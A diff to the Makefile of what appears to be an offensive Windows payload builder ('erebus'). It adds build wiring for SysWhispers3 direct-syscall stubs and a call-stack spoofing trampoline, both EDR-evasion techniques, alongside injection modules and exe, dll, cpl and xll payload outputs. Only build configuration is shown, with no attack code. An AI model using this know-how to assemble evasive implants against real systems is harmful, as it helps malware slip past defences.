@@ -119,6 +119,55 @@ endif
 SRCS := $(wildcard src/*.c src/*.cpp src/injection/*.cpp src/helpers/*.cpp src/guardrails/*.cpp src/evasion/*.cpp)
 OBJS := $(patsubst %.cpp,%.o,$(patsubst %.c,%.o,$(SRCS)))
 
+# ---------------------------------------------------------------------------
+# SysWhispers3 / callstack spoof wiring
+# ---------------------------------------------------------------------------
+# Gated on the same CONFIG_* macros that gate the C++ call sites in
+# config.hpp; builder.py passes both on the `make` command line so the
+# Makefile + header agree without parsing config.hpp.
+#
+# The bundled Syscalls-asm.x{64,86}.asm + callstack_spoof.asm files are
+# MASM-syntax, targetting MSVC's ml64. The MinGW toolchain used here has
+# no MASM assembler, so:
+#   - SysWhispers3: use Syscalls.c exclusively. It ships the same 482
+#     Sw3Nt* stubs via __declspec(naked) + inline asm and also owns
+#     SW3_PopulateSyscallList / SW3_GetSyscall{Number,Address}. Single
+#     source of truth on MinGW builds.
+#   - Callstack spoof: SpoofCall() lives only in callstack_spoof.asm and
+#     has no MinGW-compatible counterpart. Toggling CONFIG_CALLSTACK_
+#     SPOOF_ENABLED=1 on MinGW adds the -D flag so the .cpp call sites
+#     try to link SpoofCall and fail. Effectively MSVC-only; kept here
+#     as a no-op flag until a GAS translation lands.
+CONFIG_SYSCALL_BACKEND        ?= 0
+CONFIG_CALLSTACK_SPOOF_ENABLED ?= 0
+
+ifeq ($(CONFIG_SYSCALL_BACKEND),1)
+    CFLAGS   += -DCONFIG_SYSCALL_BACKEND=1
+    SW3_C_SRC := src/evasion/Syscalls.c
+    SW3_C_OBJ := $(SW3_C_SRC:.c=.o)
+    OBJS      += $(SW3_C_OBJ)
+    # Syscalls.c inline asm uses bare intel syntax (`mov [rsp+8], rcx`).
+    # -masm=intel alone does not forward the matching flags to `as`, which
+    # then errors with "operand size mismatch". Force intel syntax and
+    # naked-reg through -Wa, add the Syscalls.h include path (file lives
+    # under include/evasion/sw3/ but its #include uses no subdir), and
+    # force-include the SE_SIGNING_LEVEL shim since MinGW's winnt.h omits
+    # that typedef while SysWhispers3 references it.
+    $(SW3_C_OBJ): CFLAGS += -Wa,-msyntax=intel,-mnaked-reg -Iinclude/evasion/sw3 -include include/evasion/sw3/se_signing_level_shim.h
+endif
+ifeq ($(CONFIG_CALLSTACK_SPOOF_ENABLED),1)
+    CFLAGS   += -DCONFIG_CALLSTACK_SPOOF_ENABLED=1
+    # SpoofCall() lives in callstack_spoof_gas.S — a GAS port of the
+    # MASM-only callstack_spoof.asm so MinGW's as can consume it. x64
+    # only; the trampoline uses the Win64 ABI (shadow space + r10/r11
+    # scratch) and has no x86 counterpart, so silently drop it there.
+    ifeq ($(ARCH),x64)
+        CS_S_SRC  := src/evasion/callstack_spoof_gas.S
+        CS_S_OBJ  := $(CS_S_SRC:.S=.o)
+        OBJS      += $(CS_S_OBJ)
+    endif
+endif
+
 # Test sources (exclude main.cpp, use test_erebus.cpp instead)
 TEST_SRCS := $(wildcard tests/*.cpp src/helpers/*.cpp)
 TEST_OBJS := $(patsubst %.cpp,%.o,$(TEST_SRCS))
@@ -131,6 +180,9 @@ GUARDRAILS_TEST_OUT := erebus_guardrails_test.exe
 
 %.o: %.cpp
 	$(CC) $(CFLAGS) -c $< -o $@
+
+%.o: %.S
+	$(CC) $(ARCH_FLAGS) -c $< -o $@
 
 STRIP_SCRIPT := $(CURDIR)/scripts/strip_metadata.py
 
@@ -430,7 +482,7 @@ test-all-payloads:
 	@ls -lh $(PAYLOADS_DIR)/
 
 clean:
-	rm -f src/*.o src/helpers/*.o src/injection/*.o src/guardrails/*.o src/evasion/*.o tests/*.o $(RES) $(CURDIR)/erebus.exe $(CURDIR)/erebus.dll $(CURDIR)/erebus.cpl $(CURDIR)/erebus.xll $(TEST_OUT) $(TEST_DLL_OUT) $(GUARDRAILS_TEST_OUT) $(INJECTION_TEST_OUT) $(INJECTION_TEST_DLL_OUT) $(INJECTION_TEST_CPL_OUT) $(INJECTION_TEST_XLL_OUT)
+	rm -f src/*.o src/helpers/*.o src/injection/*.o src/guardrails/*.o src/evasion/*.o src/evasion/*.obj tests/*.o $(RES) $(CURDIR)/erebus.exe $(CURDIR)/erebus.dll $(CURDIR)/erebus.cpl $(CURDIR)/erebus.xll $(TEST_OUT) $(TEST_DLL_OUT) $(GUARDRAILS_TEST_OUT) $(INJECTION_TEST_OUT) $(INJECTION_TEST_DLL_OUT) $(INJECTION_TEST_CPL_OUT) $(INJECTION_TEST_XLL_OUT)
 
 clean-payloads:
 	rm -rf $(PAYLOADS_DIR)
